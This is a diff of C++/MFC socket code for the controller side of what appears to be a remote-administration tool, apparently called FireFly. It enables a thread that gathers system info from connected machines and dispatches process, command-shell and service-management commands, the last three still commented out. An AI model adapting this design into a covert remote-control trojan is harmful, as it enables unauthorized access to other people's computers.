@@ -3,7 +3,7 @@
 #include "ClientSock.h"
 #include "FireFlyDlg.h"
 
-CArray<ServItem,ServItem&>m_ServArray;
+CArray<ServItem,ServItem&>g_ServArray;
 
 
 CClientSock::CClientSock(void)
@@ -88,8 +88,8 @@ UINT CClientSock:: MyControllingFunction(LPVOID pParam)
 				continue;
 			}
 
-			int idx=m_ServArray.Add(sitem);
-			AfxBeginThread(pThis->m_ClientSock.MyRecvFunction,LPVOID(&m_ServArray.GetAt(idx)));
+			int idx=g_ServArray.Add(sitem);
+			AfxBeginThread(pThis->m_ClientSock.MyRecvFunction,LPVOID(&g_ServArray.GetAt(idx)));
 		}
 		Sleep(100);
 	}
@@ -152,51 +152,50 @@ BOOL CClientSock::MyReciveCommand(SOCKET sk,COMMAND &cmd)
 
 UINT __cdecl CClientSock::MyRecvFunction( LPVOID pParam )
 {
-	//ServItem sitem = *(ServItem*)pParam;
-	//CMainFrame *pFram = (CMainFrame*)AfxGetApp()->m_pMainWnd;
-	//CHeiHuClientView *pView = (CHeiHuClientView*)pFram->GetActiveView();
+	ServItem sitem = *(ServItem*)pParam;
+	CFireFlyDlg *pDlg = (CFireFlyDlg*)AfxGetApp()->m_pMainWnd;
 
-	//pView->m_ClientSock.MySendCommand(sitem.sk,MYGETSYSINFO,NULL,0);
-	//while (1)
-	//{
-	//	int idx=-1;
-	//	if (pView->m_ClientSock.MySelect(sitem.sk))
-	//	{
-	//		COMMAND command;
-	//		ZeroMemory(&command,COMSIZE);            
-	//		if (!pView->m_ClientSock.MyReciveCommand(sitem.sk,command))
-	//		{
-	//			pView->m_ClientSock.PanDuan(sitem.ip,idx);
-	//			pView->SendMessage(WM_OFFLINE,0,(LPARAM)idx);
-	//			return 0;
-	//		}			
+	pDlg->m_ClientSock.MySendCommand(sitem.sk,MYGETSYSINFO,NULL,0);
+	while (1)
+	{
+		int idx=-1;
+		if (pDlg->m_ClientSock.MySelect(sitem.sk))
+		{
+			COMMAND command;
+			ZeroMemory(&command,COMSIZE);            
+			if (!pDlg->m_ClientSock.MyReciveCommand(sitem.sk,command))
+			{
+				pDlg->m_ClientSock.PanDuan(sitem.ip,idx);
+				pDlg->SendMessage(WM_OFFLINE,0,(LPARAM)idx);
+				return 0;
+			}			
 
-	//		switch (command.ID)
-	//		{
-	//		case MYGETSYSINFO:
-	//	//		AfxMessageBox(_T("我是clientMYGETSYSINFO"));
-	//			pView->m_ClientSock.PanDuan(sitem.ip,idx);
-	//			SYSINFO info;
-	//			memcpy(&info,&command.buffer,sizeof(SYSINFO));
-	//			m_ServArray.GetAt(idx).cmpname = info.cmpname;
-	//			m_ServArray.GetAt(idx).memsize = info.memsize;
-	//			m_ServArray.GetAt(idx).os = info.os;
-	//			pView->SendMessage(WM_ONLINE,(WPARAM)&m_ServArray.GetAt(idx),(LPARAM)idx);
-	//			break;
-	//		case MYGETPROCESS:
-	//			pView->m_Process->ProcessComment(command);
-	//			break;
-	//		case MYCMDSHELL:
-	//			pView->m_CmdShell->CmdCommand(command);
-	//			break;
-	//		case MYSVCMANAGE:
-	//			pView->m_SvcManage->MySVCCommand(command);
-	//			break;
-	//		default:
-	//			break;
-	//		}
-	//	}
-	//}
+			switch (command.ID)
+			{
+			case MYGETSYSINFO:
+		//		AfxMessageBox(_T("我是clientMYGETSYSINFO"));
+				pDlg->m_ClientSock.PanDuan(sitem.ip,idx);
+				SYSINFO info;
+				memcpy(&info,&command.buffer,sizeof(SYSINFO));
+				g_ServArray.GetAt(idx).ComputerName = info.ComputerName;
+				g_ServArray.GetAt(idx).memsize = info.memsize;
+				g_ServArray.GetAt(idx).os = info.os;
+				pDlg->SendMessage(WM_ONLINE);
+				break;
+			case MYGETPROCESS:
+			//	pDlg->m_Process->ProcessComment(command);
+				break;
+			case MYCMDSHELL:
+			//	pDlg->m_CmdShell->CmdCommand(command);
+				break;
+			case MYSVCMANAGE:
+			//	pDlg->m_SvcManage->MySVCCommand(command);
+				break;
+			default:
+				break;
+			}
+		}
+	}
 
 
 	return 0;
@@ -205,9 +204,9 @@ UINT __cdecl CClientSock::MyRecvFunction( LPVOID pParam )
 
 bool CClientSock::PanDuan(CString ip, int& idx)
 {
-	for(int i=0;i<m_ServArray.GetCount();i++)
+	for(int i=0;i<g_ServArray.GetCount();i++)
 	{
-		if(ip==m_ServArray.GetAt(i).ip)
+		if(ip==g_ServArray.GetAt(i).ip)
 		{
 			idx=i;
 			return false;
